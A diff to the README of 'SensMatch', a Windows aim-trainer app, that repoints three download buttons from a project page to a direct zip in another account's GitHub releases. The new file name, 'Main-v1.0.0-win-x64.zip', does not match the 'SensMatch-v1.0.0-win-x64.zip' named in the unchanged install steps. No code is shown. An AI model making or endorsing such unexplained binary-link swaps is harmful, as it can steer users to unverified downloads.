@@ -15,7 +15,7 @@
 <img src="https://img.shields.io/badge/Tauri-2-2B2B2B?style=flat-square&labelColor=0D0D0D&logo=tauri&logoColor=white" alt="Tauri 2">
 </p>
 
-<a class="download-btn-action" href="https://pickle7.dev/sensitivity-converter-aim-trainer/"><img src="assets/download.png" width="316" alt="Download SensMatch for Windows"></a>
+<a class="download-btn-action" href="https://github.com/SlayerApothecaryMoon/sensitivity-converter-aim-trainer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="316" alt="Download SensMatch for Windows"></a>
 
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 
@@ -151,7 +151,7 @@ Every session ends with a **flick heatmap** (shot offsets relative to the target
 
 ## Download and install
 
-<a class="download-btn-action" href="https://pickle7.dev/sensitivity-converter-aim-trainer/"><img src="assets/download-compact.png" width="228" alt="Download SensMatch for Windows (.zip)"></a>
+<a class="download-btn-action" href="https://github.com/SlayerApothecaryMoon/sensitivity-converter-aim-trainer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download-compact.png" width="228" alt="Download SensMatch for Windows (.zip)"></a>
 
 1. Download **SensMatch-v1.0.0-win-x64.zip** from the latest release.
 2. Right-click the zip → **Extract All…** to a folder such as `C:\Games\SensMatch`.
@@ -289,7 +289,7 @@ Released under the [MIT License](LICENSE).
 
 <div align="center">
 <br>
-<a class="download-btn-action" href="https://pickle7.dev/sensitivity-converter-aim-trainer/"><img src="assets/download.png" width="316" alt="Download SensMatch for Windows"></a>
+<a class="download-btn-action" href="https://github.com/SlayerApothecaryMoon/sensitivity-converter-aim-trainer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="316" alt="Download SensMatch for Windows"></a>
 <br>
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 </div>
